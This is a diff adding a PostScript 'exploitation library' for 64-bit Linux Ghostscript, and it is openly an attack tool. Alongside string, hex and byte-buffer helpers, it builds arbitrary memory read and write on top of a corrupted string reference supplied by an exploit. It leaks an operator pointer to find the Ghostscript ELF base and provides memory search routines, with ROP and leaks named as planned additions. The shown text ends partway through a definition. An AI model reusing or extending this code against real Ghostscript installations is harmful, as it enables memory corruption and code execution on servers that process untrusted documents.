@@ -1,0 +1,1807 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  ghostscript_exploitation_library : library_v2.ps
+%
+%  APIv2 development copy. Single flat PostScript file: the whole library lives
+%  here so it can be dropped in as one blob through an arbitrary r/w primitive.
+%  Sections are numbered; new capabilities (r/w wrappers, leaks, ROP, ...)
+%  append below.
+%  Target: 64-bit Ghostscript on LINUX ONLY, dynamically linked against
+%  glibc (developed/tested on 10.02.1). Windows, macOS, the BSDs, any
+%  32-bit build, static builds, and musl/Alpine are out of scope.
+%
+%  Known unsupported: GS 9.01 uses 32-bit integers regardless of platform.
+%  Other versions may also be 32-bit when compiled on a 32-bit host or with
+%  a compiler where sizeof(long)==4 (e.g. MSVC on Windows).  The runtime
+%  check below catches all such cases.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: require_64bit
+% Fail fast if the interpreter lacks 64-bit integers.
+2147483647 1 add type /integertype ne {
+    (\n*** FATAL: this library requires 64-bit integer support. ***\n) print
+    (    Your Ghostscript interpreter uses 32-bit integers.\n) print
+    (    Known affected: GS 9.01, any 32-bit build, MSVC/Windows builds.\n) print
+    flush
+    /require_64bit cvx /invalidaccess signalerror
+} if
+%%END
+
+%%DEF: HEXDIGITS
+/HEXDIGITS (0123456789ABCDEF) def   % nibble value -> uppercase hex digit
+%%END
+
+%%DEF: typecheck
+% Typecheck: stop immediately if the value on the stack is not the expected type.
+% value /expectedtype -> value  (unchanged if OK; stops on mismatch)
+/typecheck {
+    1 index type 1 index ne { pop pop stop } { pop } ifelse
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  1. String construction / manipulation
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: cat
+% Concatenate two strings (Ghostscript has no built-in string concat).
+% (a) (b) -> (ab)
+/cat {
+    4 dict begin
+        count 2 sub /depth exch def
+        {
+            /b exch /stringtype typecheck def
+            /a exch /stringtype typecheck def
+            a length b length add string   % buf
+            dup 0       a putinterval      % buf  ; buf[0..]    = a
+            dup a length b putinterval     % buf  ; buf[alen..] = b
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: itoa
+% Integer -> decimal string. 20 bytes holds any signed 64-bit value.
+% 12345 -> (12345)
+/itoa {
+    /integertype typecheck
+    20 string cvs
+} bind def
+%%END
+
+%%DEF: le_reverse
+% Reverse the byte order of a string (big- <-> little-endian swap).
+% (\001\002\003\004) -> (\004\003\002\001)
+/le_reverse {
+    /stringtype typecheck
+    3 dict begin
+        /src exch def
+        /dst src length string def
+        0 1 src length 1 sub {
+            /i exch def
+            dst  src length 1 sub i sub  src i get  put
+        } for
+        dst
+    end
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  2. String comparison / search
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: streq
+% Value equality of two strings.
+% (a) (b) -> bool
+/streq {
+    3 dict begin
+        count 2 sub /depth exch def
+        {
+            /b exch /stringtype typecheck def
+            /a exch /stringtype typecheck def
+            a b eq
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: index_of
+% Index of the first occurrence of `sub` in `str`, or -1 if absent.
+% (hello world) (world) -> 6
+/index_of {
+    4 dict begin
+        count 2 sub /depth exch def
+        {
+            /needle exch /stringtype typecheck def
+            /haystack exch /stringtype typecheck def
+            haystack needle search { length exch pop exch pop } { pop -1 } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: nl
+% Print a newline to stdout.
+/nl { (\n) print } bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  3. Hex / integer conversion
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: hex_nibble
+% ASCII hex digit (0-9, a-f, A-F) -> nibble value 0..15. Input is a char code.
+% 65 ('A') -> 10
+/hex_nibble {
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /c exch /integertype typecheck def
+            c 48 ge c 57 le and { c 48 sub } {        % '0'..'9'
+                c 65 ge c 70 le and { c 55 sub } {    % 'A'..'F'  (- 65 + 10)
+                    c 97 ge c 102 le and { c 87 sub } % 'a'..'f'  (- 97 + 10)
+                    { stop } ifelse
+                } ifelse
+            } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: hex_upper
+% Uppercase an ASCII hex string. Returns a fresh string; input untouched.
+% (deadBEEF) -> (DEADBEEF)
+/hex_upper {
+    /stringtype typecheck
+    2 dict begin
+        /s exch dup length string copy def
+        0 1 s length 1 sub {
+            /i exch def
+            s i get
+            dup 97 ge 1 index 102 le and { 32 sub } if
+            s i 3 -1 roll put
+        } for
+        s
+    end
+} bind def
+%%END
+
+%%DEF: hextoint
+% Hex string -> unsigned integer (any case, up to 16 digits = full 64 bits).
+% Accumulates with shift+or (not *16 +), because int multiply/add overflow
+% past 2^63 would silently produce a real and corrupt the value.
+% (deadbeef) -> 3735928559 ; (FFFFFFFFFFFFFFFF) -> -1 (int64 bit pattern)
+/hextoint {
+    3 dict begin
+        count 1 sub /depth exch def
+        {
+            /s exch /stringtype typecheck def
+            s length 0 eq { stop } if
+            0 s { hex_nibble exch 4 bitshift or } forall
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: inttohex
+% Unsigned integer -> uppercase hex string of exactly `width` digits.
+% Low-order, zero-padded; the bit pattern is treated as unsigned.
+% 3735928559 8 -> (DEADBEEF)    255 4 -> (00FF)
+/inttohex {
+    5 dict begin
+        count 2 sub /depth exch def
+        {
+            /w exch /integertype typecheck def
+            /v exch /integertype typecheck def
+            w 0 le { stop } if
+            w string
+            w 1 sub -1 0 {
+                /i exch def
+                dup i HEXDIGITS v 15 and get put
+                /v v -4 bitshift def
+            } for
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  4. Byte-buffer codec -- pack/unpack ints in a local string (little-endian)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: buf_read_u8
+% Read 1 byte at offset as unsigned int.
+% (buf) offset -> int
+/buf_read_u8 {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /stringtype ne { pop pop stop } if
+    get
+} bind def
+%%END
+
+%%DEF: buf_read_u16
+% Read 2 bytes at offset as little-endian unsigned int.
+% (buf) offset -> int
+/buf_read_u16 {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /stringtype ne { pop pop stop } if
+    2 copy get
+    3 1 roll 1 add get 8 bitshift or
+} bind def
+%%END
+
+%%DEF: buf_read_u32
+% Read 4 bytes at offset as little-endian unsigned int.
+% (buf) offset -> int
+/buf_read_u32 {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /stringtype ne { pop pop stop } if
+    2 copy get
+    3 1 roll
+    2 copy 1 add get  8 bitshift
+    3 1 roll
+    2 copy 2 add get 16 bitshift
+    3 1 roll
+    2 copy 3 add get 24 bitshift
+    3 1 roll pop pop
+    or or or
+} bind def
+%%END
+
+%%DEF: buf_read_u64
+% Read 8 bytes at offset as little-endian 64-bit int.
+% (buf) offset -> int
+/buf_read_u64 {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /stringtype ne { pop pop stop } if
+    2 copy get
+    3 1 roll
+    2 copy 1 add get  8 bitshift
+    3 1 roll
+    2 copy 2 add get 16 bitshift
+    3 1 roll
+    2 copy 3 add get 24 bitshift
+    3 1 roll
+    2 copy 4 add get 32 bitshift
+    3 1 roll
+    2 copy 5 add get 40 bitshift
+    3 1 roll
+    2 copy 6 add get 48 bitshift
+    3 1 roll
+    2 copy 7 add get 56 bitshift
+    3 1 roll pop pop
+    or or or or or or or
+} bind def
+%%END
+
+%%DEF: buf_write_u8
+% Write low 8 bits of int at offset.
+% (buf) offset int ->
+/buf_write_u8 {
+    dup type /integertype ne { pop pop pop stop } if
+    1 index type /integertype ne { pop pop pop stop } if
+    2 index type /stringtype ne { pop pop pop stop } if
+    3 copy 255 and put
+    pop pop pop
+} bind def
+%%END
+
+%%DEF: buf_write_u16
+% Write 2 bytes as little-endian at offset.
+% (buf) offset int ->
+/buf_write_u16 {
+    dup type /integertype ne { pop pop pop stop } if
+    1 index type /integertype ne { pop pop pop stop } if
+    2 index type /stringtype ne { pop pop pop stop } if
+    3 copy      255 and put
+    3 copy -8 bitshift 255 and exch 1 add exch put
+    pop pop pop
+} bind def
+%%END
+
+%%DEF: buf_write_u32
+% Write 4 bytes as little-endian at offset.
+% (buf) offset int ->
+/buf_write_u32 {
+    dup type /integertype ne { pop pop pop stop } if
+    1 index type /integertype ne { pop pop pop stop } if
+    2 index type /stringtype ne { pop pop pop stop } if
+    3 copy       255 and put
+    3 copy  -8 bitshift 255 and exch 1 add exch put
+    3 copy -16 bitshift 255 and exch 2 add exch put
+    3 copy -24 bitshift 255 and exch 3 add exch put
+    pop pop pop
+} bind def
+%%END
+
+%%DEF: buf_write_u64
+% Write 8 bytes as little-endian at offset.
+% (buf) offset int ->
+/buf_write_u64 {
+    dup type /integertype ne { pop pop pop stop } if
+    1 index type /integertype ne { pop pop pop stop } if
+    2 index type /stringtype ne { pop pop pop stop } if
+    3 copy       255 and put
+    3 copy  -8 bitshift 255 and exch 1 add exch put
+    3 copy -16 bitshift 255 and exch 2 add exch put
+    3 copy -24 bitshift 255 and exch 3 add exch put
+    3 copy -32 bitshift 255 and exch 4 add exch put
+    3 copy -40 bitshift 255 and exch 5 add exch put
+    3 copy -48 bitshift 255 and exch 6 add exch put
+    3 copy -56 bitshift 255 and exch 7 add exch put
+    pop pop pop
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  5. Arbitrary read/write seam (initialization)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+%  The library is inert until `rw_init` receives a writable byte window that
+%  controls a live slave string ref. APIv2 is intentionally breaking: callers do
+%  not provide read/write callbacks, word callbacks, or scratch memory. They
+%  provide only the slave-window contract, and the library derives stable memory
+%  I/O from that contract.
+%
+%      << /master_string            writable_ref_window_string
+%         /slave_holder             array_holding_slave
+%         /slave_index              slave_index
+%         /slave_ref_window_offset  slave_ref_start_byte_in_master_string
+%         /slave_data_ptr_offset    data_pointer_byte_inside_slave_ref >> rw_init
+%
+%  rw_init temporarily writes a known operator into the visible slave-holder
+%  slot, reads its C procedure pointer from the master window, restores the
+%  slave string, and resolves the GS ELF image base from that pointer.
+%
+%  Then use the mem_* family (target memory at an address):
+%
+%      addr mem_read_u8 / _u16 / _u32 / _u64   -> int    % read 1/2/4/8 bytes
+%      addr val mem_write_u8 / _u16 / _u32 / _u64        % write 1/2/4/8 bytes
+%      addr dst len mem_read_into                        % read into existing dst
+%      addr src len mem_write_from                       % write existing src bytes
+%
+%  Scalar helpers use the library-derived /read_u64 and /write_u64 procedures
+%  installed by rw_init.
+
+%%DEF: RW
+% Library-private r/w state and reusable I/O buffers.
+/RW_BUFSZ 4096 def
+/RW 32 dict def
+RW /ready false put
+%%END
+
+%%DEF: RWV2
+% APIv2 slave-window state. Only populated by rw_init.
+/RWV2 32 dict def
+%%END
+
+%%DEF: rw_init
+% APIv2 initializer. The exploit supplies a writable byte window that controls a
+% live slave string ref; the library derives stable byte/word memory I/O from it.
+% << /master_string string
+%    /slave_holder array
+%    /slave_index int
+%    /slave_ref_window_offset int
+%    /slave_data_ptr_offset int >> ->
+/rw_init {
+    /dicttype typecheck
+    28 dict begin
+        /cfg exch def
+        /old_rw RW dup length dict copy def
+        /old_rwv2 RWV2 dup length dict copy def
+        /op_slot_mutated false def
+        {
+            cfg length 5 ne { stop } if
+            cfg /master_string known not { stop } if
+            cfg /slave_holder known not { stop } if
+            cfg /slave_index known not { stop } if
+            cfg /slave_ref_window_offset known not { stop } if
+            cfg /slave_data_ptr_offset known not { stop } if
+
+            cfg /master_string get /stringtype typecheck /master_string exch def
+            cfg /slave_holder get /holder exch def
+            holder type /arraytype ne { stop } if
+            cfg /slave_index get /integertype typecheck /slave_index exch def
+            slave_index 0 lt { stop } if
+            slave_index holder length ge { stop } if
+            holder slave_index get /stringtype typecheck /slave exch def
+
+            cfg /slave_ref_window_offset get /integertype typecheck /ref_off exch def
+            cfg /slave_data_ptr_offset get /integertype typecheck /ptr_field_off exch def
+            ref_off 0 lt { stop } if
+            ptr_field_off 0 lt { stop } if
+            ref_off ptr_field_off add /ptr_window_off exch def
+            ptr_window_off 0 lt { stop } if
+            ptr_window_off 7 add master_string length ge { stop } if
+
+            /probe_op systemdict /add get def
+            /probe_op load type /operatortype ne { stop } if
+            holder slave_index /probe_op load put
+            /op_slot_mutated true def
+            holder slave_index get type /operatortype ne { stop } if
+            master_string ptr_window_off buf_read_u64 /image_ptr exch def
+            image_ptr 0 eq { stop } if
+            holder slave_index slave put
+            /op_slot_mutated false def
+
+            master_string ptr_window_off buf_read_u64 /orig_ptr exch def
+            orig_ptr 0 eq { stop } if
+
+            RWV2 /master_string master_string put
+            RWV2 /slave_holder holder put
+            RWV2 /slave_index slave_index put
+            RWV2 /slave_ref_window_offset ref_off put
+            RWV2 /slave_data_ptr_offset ptr_field_off put
+            RWV2 /slave_ptr_window_offset ptr_window_off put
+            RWV2 /slave_original_ptr orig_ptr put
+            RWV2 /slave_string slave put
+            RWV2 /tmp8 8 string put
+
+            orig_ptr rw_sw_set_ptr
+            rw_sw_fetch_slave pop
+            rw_sw_validate
+
+            RW /read_into /rw_sw_read_into load put
+            RW /write_from /rw_sw_write_from load put
+            RW /read_u64 /rw_sw_read_u64 load put
+            RW /write_u64 /rw_sw_write_u64 load put
+            RW /rbuf RW_BUFSZ string put
+            RW /wbuf RW_BUFSZ string put
+            RW /tmp8 8 string put
+            RW /tmp4 4 string put
+            RW /tmp2 2 string put
+            RW /tmp1 1 string put
+            RW /nul1 1 string put
+            RW /nul1 get 0 0 put
+            RW /scratch orig_ptr put
+
+            RW /ready true put
+            { ([+] rw_init: gs image base start\n) print } dbg
+            image_ptr elf_find_base /gb exch def
+            gb -1 eq { stop } if
+            RW /gs_base gb put
+            { ([+] rw_init: gs_base=0x) print gb 16 inttohex print nl } dbg
+        } stopped {
+            op_slot_mutated { holder slave_index slave put } if
+            old_rw old_rwv2
+            end
+            /RWV2 exch def
+            /RW exch def
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: rw_sw_fetch_slave
+% Fetch the live slave string from the registered holder/index pair. -> string
+/rw_sw_fetch_slave {
+    RWV2 /slave_holder get RWV2 /slave_index get get
+    dup type /stringtype ne { pop stop } if
+} bind def
+%%END
+
+%%DEF: rw_sw_set_ptr
+% Retarget the slave string backing pointer. addr ->
+/rw_sw_set_ptr {
+    /integertype typecheck
+    RWV2 /master_string get RWV2 /slave_ptr_window_offset get 3 -1 roll buf_write_u64
+} bind def
+%%END
+
+%%DEF: rw_sw_restore_ptr
+% Restore the slave string backing pointer to its original address.
+/rw_sw_restore_ptr {
+    RWV2 /slave_original_ptr get rw_sw_set_ptr
+} bind def
+%%END
+
+%%DEF: rw_sw_read_into
+% Slave-window derived read primitive. addr dst len ->
+/rw_sw_read_into {
+    dup type /integertype ne { pop pop pop stop } if
+    1 index type /stringtype ne { pop pop pop stop } if
+    2 index type /integertype ne { pop pop pop stop } if
+    dup 0 lt { pop pop pop stop } if
+    1 index length 1 index lt { pop pop pop stop } if
+    5 dict begin
+        /len exch def
+        /dst exch def
+        /addr exch def
+        count /depth exch def
+        {
+            addr rw_sw_set_ptr
+            rw_sw_fetch_slave /src exch def
+            0 1 len 1 sub {
+                /i exch def
+                dst i src i get put
+            } for
+            rw_sw_restore_ptr
+        } stopped {
+            rw_sw_restore_ptr
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: rw_sw_write_from
+% Slave-window derived write primitive. addr src len ->
+/rw_sw_write_from {
+    dup type /integertype ne { pop pop pop stop } if
+    1 index type /stringtype ne { pop pop pop stop } if
+    2 index type /integertype ne { pop pop pop stop } if
+    dup 0 lt { pop pop pop stop } if
+    1 index length 1 index lt { pop pop pop stop } if
+    5 dict begin
+        /len exch def
+        /src exch def
+        /addr exch def
+        count /depth exch def
+        {
+            addr rw_sw_set_ptr
+            rw_sw_fetch_slave /dst exch def
+            0 1 len 1 sub {
+                /i exch def
+                dst i src i get put
+            } for
+            rw_sw_restore_ptr
+        } stopped {
+            rw_sw_restore_ptr
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: rw_sw_read_u64
+% Slave-window derived 64-bit read. Avoids allocation in the hot path.
+% addr -> value
+/rw_sw_read_u64 {
+    /integertype typecheck
+    {
+        rw_sw_set_ptr
+        rw_sw_fetch_slave
+        dup length 8 lt { pop rw_sw_restore_ptr stop } if
+        dup 0 get
+        exch
+        dup 1 get  8 bitshift
+        exch
+        dup 2 get 16 bitshift
+        exch
+        dup 3 get 24 bitshift
+        exch
+        dup 4 get 32 bitshift
+        exch
+        dup 5 get 40 bitshift
+        exch
+        dup 6 get 48 bitshift
+        exch
+        dup 7 get 56 bitshift
+        exch pop
+        or or or or or or or
+        rw_sw_restore_ptr
+    } stopped {
+        rw_sw_restore_ptr
+        stop
+    } if
+} bind def
+%%END
+
+%%DEF: rw_sw_write_u64
+% Slave-window derived 64-bit write. addr value ->
+/rw_sw_write_u64 {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    RWV2 /tmp8 get 0 2 index buf_write_u64
+    pop
+    RWV2 /tmp8 get 8 rw_sw_write_from
+} bind def
+%%END
+
+%%DEF: rw_sw_validate
+% Validate the derived slave-window operations against the slave's own backing
+% store, then restore all touched bytes and the original backing pointer.
+/rw_sw_validate {
+    12 dict begin
+        /slave RWV2 /slave_string get def
+        slave length 16 lt { end stop } if
+        /base RWV2 /slave_original_ptr get def
+        /saved_bytes 16 string def
+        /probe 16 string def
+        /pattern (APIv2SW012345678) def
+        0 1 15 {
+            /i exch def
+            saved_bytes i slave i get put
+        } for
+        {
+            base pattern 16 rw_sw_write_from
+            base probe 16 rw_sw_read_into
+            probe pattern eq not { stop } if
+
+            base 4 add (xyz) 3 rw_sw_write_from
+            base probe 16 rw_sw_read_into
+            probe 0 get pattern 0 get ne { stop } if
+            probe 3 get pattern 3 get ne { stop } if
+            probe 4 get 120 ne { stop } if
+            probe 5 get 121 ne { stop } if
+            probe 6 get 122 ne { stop } if
+            probe 7 get pattern 7 get ne { stop } if
+
+            base 16#1122334455667788 rw_sw_write_u64
+            base rw_sw_read_u64 16#1122334455667788 ne { stop } if
+            0 1 7 {
+                pop
+                base rw_sw_read_u64 pop
+            } for
+
+            base saved_bytes 16 rw_sw_write_from
+            rw_sw_restore_ptr
+        } stopped {
+            RWV2 /slave_original_ptr get rw_sw_set_ptr
+            slave 0 saved_bytes putinterval
+            rw_sw_restore_ptr
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: rw_ready
+% Has rw_init been called?  -> bool
+/rw_ready { RW /ready get } bind def
+%%END
+
+%%DEF: rw_gs_base
+% ELF base of the GS binary (libgs.so or monolithic gs).  -> addr
+/rw_gs_base {
+    rw_require
+    RW /gs_base get
+} bind def
+%%END
+
+%%DEF: rw_require
+% Fail fast if the r/w seam has not been initialized.
+/rw_require { rw_ready not { stop } if } bind def
+%%END
+
+%%DEF: mem_read_into
+% Read `len` bytes at `addr` into existing string `dst`.
+% addr dst len ->
+/mem_read_into {
+    4 dict begin
+        count 3 sub /depth exch def
+        {
+            /len exch /integertype typecheck def
+            /dst exch /stringtype typecheck def
+            /addr exch /integertype typecheck def
+            len 0 lt { stop } if
+            dst length len lt { stop } if
+            rw_require
+            addr dst len RW /read_into get exec
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_write_from
+% Write the first `len` bytes of existing string `src` to `addr`.
+% addr src len ->
+/mem_write_from {
+    4 dict begin
+        count 3 sub /depth exch def
+        {
+            /len exch /integertype typecheck def
+            /src exch /stringtype typecheck def
+            /addr exch /integertype typecheck def
+            len 0 lt { stop } if
+            src length len lt { stop } if
+            rw_require
+            addr src len RW /write_from get exec
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_read_u8
+% Read the byte at absolute address `addr`.  addr -> int
+/mem_read_u8 {
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /addr exch /integertype typecheck def
+            rw_require
+            addr RW /tmp1 get 1 mem_read_into
+            RW /tmp1 get 0 buf_read_u8
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_read_u16
+% Read 2 bytes (little-endian) at absolute address `addr`.  addr -> int
+/mem_read_u16 {
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /addr exch /integertype typecheck def
+            rw_require
+            addr RW /tmp2 get 2 mem_read_into
+            RW /tmp2 get 0 buf_read_u16
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_read_u32
+% Read 4 bytes (little-endian) at absolute address `addr`.  addr -> int
+/mem_read_u32 {
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /addr exch /integertype typecheck def
+            rw_require
+            addr RW /tmp4 get 4 mem_read_into
+            RW /tmp4 get 0 buf_read_u32
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_read_u64
+% Read 8 bytes (little-endian) at absolute address `addr`.  addr -> int
+/mem_read_u64 {
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /addr exch /integertype typecheck def
+            rw_require
+            RW /read_u64 known not { stop } if
+            addr RW /read_u64 get exec
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_write_u8
+% Write the byte `v` at absolute address `addr`.  addr v ->
+/mem_write_u8 {
+    3 dict begin
+        count 2 sub /depth exch def
+        {
+            /v exch /integertype typecheck def
+            /addr exch /integertype typecheck def
+            rw_require
+            RW /tmp1 get 0 v buf_write_u8
+            addr RW /tmp1 get 1 mem_write_from
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_write_u16
+% Write `v` as 2 bytes (little-endian) at absolute address `addr`.  addr v ->
+/mem_write_u16 {
+    3 dict begin
+        count 2 sub /depth exch def
+        {
+            /v exch /integertype typecheck def
+            /addr exch /integertype typecheck def
+            rw_require
+            RW /tmp2 get 0 v buf_write_u16
+            addr RW /tmp2 get 2 mem_write_from
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_write_u32
+% Write `v` as 4 bytes (little-endian) at absolute address `addr`.  addr v ->
+/mem_write_u32 {
+    3 dict begin
+        count 2 sub /depth exch def
+        {
+            /v exch /integertype typecheck def
+            /addr exch /integertype typecheck def
+            rw_require
+            RW /tmp4 get 0 v buf_write_u32
+            addr RW /tmp4 get 4 mem_write_from
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_write_u64
+% Write `v` as 8 bytes (little-endian) at absolute address `addr`.  addr v ->
+/mem_write_u64 {
+    3 dict begin
+        count 2 sub /depth exch def
+        {
+            /v exch /integertype typecheck def
+            /addr exch /integertype typecheck def
+            rw_require
+            RW /write_u64 known not { stop } if
+            addr v RW /write_u64 get exec
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  6. Diagnostics
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: DEBUG
+% Global debug flag. Default off -> the post-exploitation layer is silent.
+% Enable with:  /DEBUG true def
+/DEBUG false def
+%%END
+
+%%DEF: dbg
+% Run a printing proc only when DEBUG is true; otherwise discard it (so there is
+% no formatting cost when off). Convention: [+] progress, [!] failure.
+% { proc } ->
+/dbg { DEBUG { exec } { pop } ifelse } bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  7. Memory helpers (C strings, search) -- built on the mem_* seam
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: mem_write_cstring
+% Write `(string)` followed by a NUL terminator at absolute address `addr`.
+% addr (string) ->
+/mem_write_cstring {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    4 dict begin
+        count 2 sub /depth exch def
+        {
+            /s exch def
+            /addr exch def
+            addr s s length mem_write_from
+            addr s length add RW /nul1 get 1 mem_write_from
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_cstring_eq
+% Compare a target NUL-terminated string with local `(s)` without allocating.
+% addr (s) -> bool
+/mem_cstring_eq {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    6 dict begin
+        count 2 sub /depth exch def
+        {
+            /s exch def
+            /addr exch def
+            /result true def
+            0 1 s length 1 sub {
+                /i exch def
+                addr i add mem_read_u8 s i get ne {
+                    /result false def
+                    exit
+                } if
+            } for
+            result {
+                addr s length add mem_read_u8 0 eq
+            } {
+                false
+            } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_match_at
+% True if `(needle)` matches target bytes exactly at `addr`.
+% addr (needle) -> bool
+/mem_match_at {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    6 dict begin
+        count 2 sub /depth exch def
+        {
+            /needle exch def
+            /addr exch def
+            /result true def
+            0 1 needle length 1 sub {
+                /i exch def
+                addr i add mem_read_u8 needle i get ne {
+                    /result false def
+                    exit
+                } if
+            } for
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_cstring_contains
+% Search a target NUL-terminated string for `(needle)` without allocating.
+% Scans at most RW_BUFSZ bytes.  addr (needle) -> bool
+/mem_cstring_contains {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    7 dict begin
+        count 2 sub /depth exch def
+        {
+            /needle exch def
+            /addr exch def
+            /result false def
+            needle length 0 eq {
+                /result true def
+            } {
+                0 1 RW_BUFSZ 1 sub {
+                    /i exch def
+                    addr i add mem_read_u8 /b exch def
+                    b 0 eq { exit } if
+                    b needle 0 get eq {
+                        addr i add needle mem_match_at {
+                            /result true def
+                            exit
+                        } if
+                    } if
+                } for
+            } ifelse
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: mem_search
+% Search [addr, addr+len) for the first occurrence of `(needle)` without
+% allocating.  addr len (needle) -> found_addr | -1
+/mem_search {
+    dup type /stringtype ne { pop pop pop stop } if
+    1 index type /integertype ne { pop pop pop stop } if
+    2 index type /integertype ne { pop pop pop stop } if
+    1 index 0 lt { pop pop pop stop } if
+    8 dict begin
